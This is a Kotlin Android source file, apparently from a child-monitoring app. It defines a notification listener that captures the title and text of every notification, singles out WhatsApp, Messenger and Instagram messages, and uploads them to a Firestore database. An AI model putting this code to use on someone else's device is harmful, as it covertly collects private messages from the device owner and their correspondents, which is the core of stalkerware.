package com.abuzahra.child.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.os.Bundle
import com.abuzahra.child.utils.FirestoreHelper

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val extras: Bundle = sbn.notification.extras
        
        val title = extras.getCharSequence("android.title")?.toString() ?: "Unknown"
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        
        // تصفية التطبيقات المهمة فقط
        if (packageName.contains("whatsapp") || packageName.contains("messenger") || packageName.contains("instagram")) {
            if (text.isNotEmpty()) {
                val data = mapOf(
                    "app" to getFriendlyAppName(packageName),
                    "title" to title,
                    "body" to text,
                    "timestamp" to System.currentTimeMillis(),
                    "package" to packageName
                )
                FirestoreHelper.uploadLog("social", data)
            }
        } else {
            // الإشعارات العامة
             val data = mapOf(
                "app" to packageName,
                "title" to title,
                "body" to text,
                "timestamp" to System.currentTimeMillis()
            )
            FirestoreHelper.uploadLog("notifications", data)
        }
    }
    
    private fun getFriendlyAppName(pkg: String): String {
        return when {
            pkg.contains("whatsapp") -> "WhatsApp"
            pkg.contains("messenger") -> "Messenger"
            pkg.contains("instagram") -> "Instagram"
            else -> pkg
        }
    }
}
